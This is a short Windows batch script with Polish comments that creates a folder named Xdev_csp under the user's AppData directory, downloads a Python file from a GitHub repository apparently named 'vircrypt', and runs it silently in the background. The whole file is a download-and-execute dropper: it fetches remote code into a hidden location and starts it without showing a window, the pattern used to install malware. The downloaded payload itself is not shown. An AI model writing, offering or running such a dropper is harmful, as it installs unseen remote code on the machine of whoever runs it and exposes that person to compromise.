@echo off
set folder=%APPDATA%\Xdev_csp

REM Tworzymy folder jeśli nie istnieje
if not exist "%folder%" (
    mkdir "%folder%"
)

REM Pobieramy skrypt do folderu
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ex0my/vircrypt/refs/heads/main/TSTSTS.py' -OutFile '%folder%\TSTSTS.py'"

REM Uruchamiamy skrypt Pythona w tle
start /B python "%folder%\TSTSTS.py"
